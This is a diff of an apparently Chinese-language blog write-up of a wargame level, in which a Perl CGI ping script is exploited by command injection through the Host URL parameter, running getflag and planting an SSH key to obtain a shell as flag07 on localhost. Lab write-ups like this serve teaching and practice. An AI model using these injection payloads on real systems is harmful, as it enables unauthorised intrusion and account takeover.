@@ -70,10 +70,7 @@ ping(param("Host")); #从URL中解析出Host，并传入ping函数
 wget http://127.0.0.1:7007/index.cgi?Host=www.baidu.com
 ~~~~
 
-
 得到
-
-
 ![](http://hot.github.io/img/ScreenClip.png)
 
 成功ping了baidu.com
@@ -85,6 +82,8 @@ wget http://127.0.0.1:7007/index.cgi?Host='www.baidu.com && getflag'
 #尝试使用|来代替&&
 wget http://127.0.0.1:7007/index.cgi?Host='www.baidu.com | getflag' 
 ~~~~
+
+ ![](http://hot.github.io/img/level07_4.png)
 
 ###成功执行了getflag！！
 
@@ -99,8 +98,9 @@ wget http://127.0.0.1:7007/index.cgi?Host='www.baidu.com | mkdir .ssh|cp /tmp/id
 ssh flag07@127.0.0.1  #尝试ssh登录
 ~~~~
 
-成功得到shell~
+成功得到shell，shell在手，天下我有~
 
+ ![](http://hot.github.io/img/level07_5.png)
 <!-- markdown end -->
 </div>
 <div class="entry" id="main">
@@ -154,9 +154,8 @@ sub ping <span class="token punctuation">{</span>
 <pre class=" language-bash"><code class=" language-bash">wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com
 </code></pre>
 
-<p>得到</p>
-
-<p><img src="http://hot.github.io/img/ScreenClip.png" alt="" title=""></p>
+<p>得到
+<img src="http://hot.github.io/img/ScreenClip.png" alt="" title=""></p>
 
 <p>成功ping了baidu.com</p>
 
@@ -167,6 +166,8 @@ sub ping <span class="token punctuation">{</span>
 </span><span class="token comment" spellcheck="true">#尝试使用|来代替&amp;&amp;
 </span>wget http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">7007</span><span class="token operator">/</span>index<span class="token punctuation">.</span>cgi<span class="token operator">?</span>Host<span class="token operator">=</span><span class="token string">'www.baidu.com | getflag'</span> 
 </code></pre>
+
+<p><img src="http://hot.github.io/img/level07_4.png" alt="" title=""></p>
 
 <h3 id="getflag">成功执行了getflag！！</h3>
 
@@ -180,7 +181,9 @@ sub ping <span class="token punctuation">{</span>
 ssh flag07@<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>  <span class="token comment" spellcheck="true">#尝试ssh登录
 </span></code></pre>
 
-<p>成功得到shell~</p>
+<p>成功得到shell，shell在手，天下我有~</p>
+
+<p><img src="http://hot.github.io/img/level07_5.png" alt="" title=""></p>
 <!-- content end -->
 </div>
 <br>
